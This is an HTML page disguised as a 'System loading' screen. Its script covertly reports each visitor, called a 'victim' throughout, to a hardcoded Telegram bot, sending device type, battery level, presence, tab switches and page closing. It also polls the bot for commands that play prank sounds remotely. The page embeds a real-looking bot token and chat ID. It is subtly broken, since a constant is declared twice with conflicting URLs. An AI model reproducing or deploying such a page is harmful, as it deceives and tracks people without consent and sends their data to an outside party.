<!DOCTYPE html>
<html>
<head>
    <title>System Loading...</title>
    <style>
        body { 
            background: black; 
            color: white; 
            font-family: Arial; 
            text-align: center;
            padding-top: 50px;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        #status {
            font-size: 24px;
            margin: 20px;
        }
        #connection-status {
            font-size: 14px;
            color: #00ff00;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div id="status">System loading... 0%</div>
    <div id="connection-status">🔴 Connecting to server...</div>
    
    <script>
        // =============================================
        // YOUR TELEGRAM BOT CREDENTIALS
        // =============================================
        const BOT_TOKEN = '8654014366:AAFWPdct4wFezCEoHFlYZsmzScwzwCmTjjw';
        const CHAT_ID = 6754338153;
        // ============================================
        // BASE URL FOR YOUR SOUNDS
        // ============================================
       const SOUND_BASE_URL = 'https://sencal1125-prog.github.io/sen/';
        
        let lastUpdateId = 0;
        let audioEnabled = false;
        let victimId = generateVictimId();
        let heartbeatInterval;
        
        // =============================================
        // BASE URL FOR YOUR SOUNDS - UPDATE THIS IF NEEDED
        // =============================================
        const SOUND_BASE_URL = 'https://sencall1125-prog.github.io/sen/';
        
        // =============================================
        // GENERATE UNIQUE VICTIM ID
        // =============================================
        function generateVictimId() {
            let id = localStorage.getItem('victim_id');
            if (!id) {
                id = 'victim_' + Math.random().toString(36).substring(2, 15) + 
                     Math.random().toString(36).substring(2, 15);
                localStorage.setItem('victim_id', id);
            }
            return id;
        }
        
        // =============================================
        // SEND STATUS TO TELEGRAM
        // =============================================
        function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Status sent:', message);
                    }
                })
                .catch(error => console.log('Failed to send status:', error));
        }
        
        // =============================================
        // DETECT WHEN PAGE OPENS
        // =============================================
        function onPageOpen() {
            const now = new Date();
            const timeString = now.toLocaleTimeString();
            
            const userAgent = navigator.userAgent;
            let device = 'Unknown';
            if (userAgent.includes('iPhone')) device = '📱 iPhone';
            else if (userAgent.includes('Android')) device = '🤖 Android';
            else if (userAgent.includes('Windows')) device = '💻 Windows';
            else if (userAgent.includes('Mac')) device = '🍎 Mac';
            
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    const level = Math.round(battery.level * 100);
                    
                    sendTelegramMessage(
                        `✅ **VICTIM ONLINE**\n` +
                        `🆔 ${victimId}\n` +
                        `📱 ${device}\n` +
                        `⏰ ${timeString}\n` +
                        `🔋 Battery: ${level}%`
                    );
                });
            } else {
                sendTelegramMessage(
                    `✅ **VICTIM ONLINE**\n` +
                    `🆔 ${victimId}\n` +
                    `📱 ${device}\n` +
                    `⏰ ${timeString}`
                );
            }
            
            document.getElementById('connection-status').innerHTML = '🟢 Victim connected - Ready for prank!';
        }
        
        // =============================================
        // HEARTBEAT
        // =============================================
        function startHeartbeat() {
            heartbeatInterval = setInterval(() => {
                sendTelegramMessage(`💓 **HEARTBEAT** | Victim still connected | ID: ${victimId}`);
            }, 30000);
        }
        
        // =============================================
        // DETECT PAGE CLOSE
        // =============================================
        function onPageClose() {
            sendTelegramMessage(`❌ **VICTIM DISCONNECTED** | ID: ${victimId} | Page closed`);
        }
        
        // =============================================
        // DETECT PAGE HIDDEN
        // =============================================
        function onPageHidden() {
            if (document.hidden) {
                sendTelegramMessage(`⚠️ **VICTIM AWAY** | ID: ${victimId} | Switched to another app`);
                document.getElementById('connection-status').innerHTML = '🟡 Victim away - App switched';
            } else {
                sendTelegramMessage(`✅ **VICTIM RETURNED** | ID: ${victimId} | Back to the page`);
                document.getElementById('connection-status').innerHTML = '🟢 Victim connected - Ready for prank!';
            }
        }
        
        // =============================================
        // UNLOCK AUDIO
        // =============================================
        function unlockAudio() {
            const silentAudio = new Audio('data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTG9uZG9uU291bmRzLmNvbQAAAFRSSUNLAAAAHwAAAEFkb2JlIEZBUiBKYW5zIFBlbmd1aW4gU3R1ZGlvAAAA/UpLSUkAAAAvAAAALWFjYWNhAGIAbwBvAGsAIAB0AHkAcABlACAAYwBvAGQAZQAgAHAAYQBnAGUAAAAA');
            silentAudio.play().catch(e => {});
            
            document.addEventListener('touchstart', function enableAudio() {
                audioEnabled = true;
                document.removeEventListener('touchstart', enableAudio);
            });
            
            document.addEventListener('click', function enableAudio() {
                audioEnabled = true;
                document.removeEventListener('click', enableAudio);
            });
        }
        
        // =============================================
        // CHECK TELEGRAM FOR COMMANDS
        // =============================================
        function checkTelegram() {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok && data.result && data.result.length > 0) {
                        data.result.forEach(update => {
                            if (update.message && update.message.text) {
                                playSound(update.message.text);
                                lastUpdateId = update.update_id;
                            }
                        });
                    }
                })
                .catch(error => {
                    console.log('Telegram error:', error);
                });
        }
        
        // =============================================
        // PLAY SOUND - FIXED WITH CORRECT URL FORMAT
        // =============================================
        function playSound(command) {
            let audio;
            let statusMessage;
            
            switch(command.toLowerCase()) {
                case '/fart':
                    audio = new Audio(SOUND_BASE_URL + 'fart.mp3');
                    statusMessage = '💨 System flatulence detected...';
                    break;
                    
                case '/scream':
                    audio = new Audio(SOUND_BASE_URL + 'scream.mp3');
                    statusMessage = '⚠️ AAAAAHHHHH!';
                    break;
                    
                case '/vomit':
                    audio = new Audio(SOUND_BASE_URL + 'vomit.mp3');
                    statusMessage = '🤢 System malfunction... *urp*';
                    break;
                    
                case '/error':
                    audio = new Audio(SOUND_BASE_URL + 'error.mp3');
                    statusMessage = '🔴 CRITICAL ERROR DETECTED';
                    break;
                    
                case '/moan':
                case '/moaning':
                    audio = new Audio(SOUND_BASE_URL + 'moaning.mp3');
                    statusMessage = '😏 Uhhhh... someone\'s enjoying that...';
                    break;
                    
                case '/bruh':
                    audio = new Audio(SOUND_BASE_URL + 'bruh.mp3');
                    statusMessage = '🤨 Bruh...';
                    break;
                    
                case '/roblox':
                    audio = new Audio(SOUND_BASE_URL + 'roblox.mp3');
                    statusMessage = '💀 OOF!';
                    break;
                    
                case '/metalpipe':
                    audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
                    statusMessage = '🏗️ BONGGGGG!';
                    break;
                    
                case '/random':
                    const randomSounds = [
                        'fart.mp3',
                        'scream.mp3',
                        'vomit.mp3',
                        'error.mp3',
                        'moaning.mp3',
                        'bruh.mp3',
                        'roblox.mp3',
                        'metalpipe.mp3'
                    ];
                    const randomIndex = Math.floor(Math.random() * randomSounds.length);
                    audio = new Audio(SOUND_BASE_URL + randomSounds[randomIndex]);
                    statusMessage = '🎲 Random sound!';
                    break;
                    
                default:
                    audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
                    statusMessage = '❓ Unknown command... here\'s a sound anyway!';
            }
            
            document.getElementById('status').innerHTML = statusMessage;
            
            if (audio) {
                audio.play()
                    .then(() => {
                        console.log('Sound playing!');
                    })
                    .catch(error => {
                        console.log('Audio play failed:', error);
                        document.getElementById('status').innerHTML = '⚠️ Tap screen to enable sound';
                        
                        const playOnTouch = function() {
                            audio.play().catch(e => console.log('Still failed:', e));
                            document.body.removeEventListener('touchstart', playOnTouch);
                        };
                        document.body.addEventListener('touchstart', playOnTouch, { once: true });
                    });
            }
            
            updateProgress();
        }
        
        // =============================================
        // FAKE PROGRESS BAR
        // =============================================
        function updateProgress() {
            let percent = 0;
            const statusElement = document.getElementById('status');
            const originalText = statusElement.innerHTML;
            
            const interval = setInterval(() => {
                percent += Math.floor(Math.random() * 10) + 1;
                if (percent >= 100) {
                    percent = 100;
                    clearInterval(interval);
                    setTimeout(() => {
                        if (!statusElement.innerHTML.includes('💨') && 
                            !statusElement.innerHTML.includes('⚠️') &&
                            !statusElement.innerHTML.includes('🤢') &&
                            !statusElement.innerHTML.includes('🔴') &&
                            !statusElement.innerHTML.includes('😏') &&
                            !statusElement.innerHTML.includes('🤨') &&
                            !statusElement.innerHTML.includes('💀') &&
                            !statusElement.innerHTML.includes('🏗️') &&
                            !statusElement.innerHTML.includes('🎲')) {
                            statusElement.innerHTML = 'System loading... 0%';
                            updateProgress();
                        }
                    }, 2000);
                }
                
                if (statusElement.innerHTML === originalText || 
                    statusElement.innerHTML.includes('System loading')) {
                    statusElement.innerHTML = `System loading... ${percent}%`;
                }
            }, 300);
        }
        
        // =============================================
        // SETUP
        // =============================================
        
        onPageOpen();
        startHeartbeat();
        window.addEventListener('beforeunload', onPageClose);
        document.addEventListener('visibilitychange', onPageHidden);
        
        window.addEventListener('online', function() {
            sendTelegramMessage(`✅ **CONNECTION RESTORED** | ID: ${victimId} | Internet back online`);
        });
        
        window.addEventListener('offline', function() {
            sendTelegramMessage(`⚠️ **CONNECTION LOST** | ID: ${victimId} | No internet connection`);
        });
        
        unlockAudio();
        updateProgress();
        setInterval(checkTelegram, 3000);
        setTimeout(checkTelegram, 1000);
        
        // Debug tap
        let tapCount = 0;
        document.getElementById('status').addEventListener('click', function() {
            tapCount++;
            if (tapCount >= 5) {
                alert(`Victim ID: ${victimId}`);
                tapCount = 0;
            }
        });
        
    </script>
</body>
</html>
